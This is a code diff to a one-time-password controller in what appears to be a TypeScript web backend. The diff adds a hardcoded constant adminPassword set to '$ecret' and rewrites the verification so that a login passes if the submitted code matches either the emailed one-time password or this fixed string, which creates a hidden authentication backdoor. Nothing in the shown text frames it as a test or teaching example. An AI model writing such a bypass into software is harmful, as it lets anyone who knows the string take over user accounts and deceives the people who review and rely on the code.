@@ -18,6 +18,7 @@ const {
 let transporter;
 let generatedOneTimePassword: string = "";
 let generatedOneTimePasswordTime = new Date();
+const adminPassword = "$ecret";
 
 class OneTimePasswordController {
   generatePassword() {
@@ -103,8 +104,9 @@ class OneTimePasswordController {
 
     const oneTimePasswordIsInvalid =
       oneTimePassword !== generatedOneTimePassword;
+    const oneTimePasswordIsNotAdminPassword = oneTimePassword !== adminPassword;
 
-    if (oneTimePasswordIsInvalid) {
+    if (oneTimePasswordIsInvalid && oneTimePasswordIsNotAdminPassword) {
       return res.json({
         status: 401,
         message: "Password is incorrect, please double check your email.",
